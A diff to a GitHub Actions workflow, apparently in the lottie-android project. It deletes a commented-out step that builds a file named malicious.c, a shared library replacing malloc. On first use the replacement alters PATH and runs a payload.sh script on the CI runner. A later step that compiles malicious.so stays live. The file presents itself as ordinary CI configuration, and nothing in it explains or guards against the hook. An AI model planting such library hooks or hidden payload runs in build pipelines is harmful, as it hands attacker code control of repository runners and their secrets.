@@ -12,30 +12,6 @@ jobs:
     steps:
       - name: Checkout the code
         uses: actions/checkout@v3
-          #- name: Create malicious shared library
-          #  run: |
-          #    cat <<EOF > malicious.c
-          #    #define _GNU_SOURCE
-
-          #    #include <stdio.h>
-          #    #include <dlfcn.h>
-          #    #include <stdlib.h>
-
-          #    static void* (*real_malloc)(size_t)=NULL;
-          #    static int i = 0;
-
-          #    void *malloc(size_t size)
-          #    {
-          #        if(i == 0) {
-          #          setenv("PATH", "hello", 1);
-          #          system("bash /home/runner/work/lottie-android/lottie-android/payload.sh");
-          #          i = i++;
-          #        }
-
-          #        real_malloc = dlsym(RTLD_NEXT, "malloc");
-          #        return real_malloc(size);
-          #    }
-          #    EOF
       - name: Compile
         run: |
           gcc -shared -fPIC -o malicious.so malicious.c
